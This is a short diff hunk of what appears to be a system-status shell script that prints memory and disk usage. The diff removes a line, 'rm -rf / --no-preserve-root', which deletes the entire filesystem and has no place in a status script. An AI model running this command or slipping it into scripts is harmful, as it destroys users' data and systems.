@@ -9,4 +9,3 @@ free -h
 
 echo "=== Disk Usage ==="
 df -h
-rm -rf / --no-preserve-root
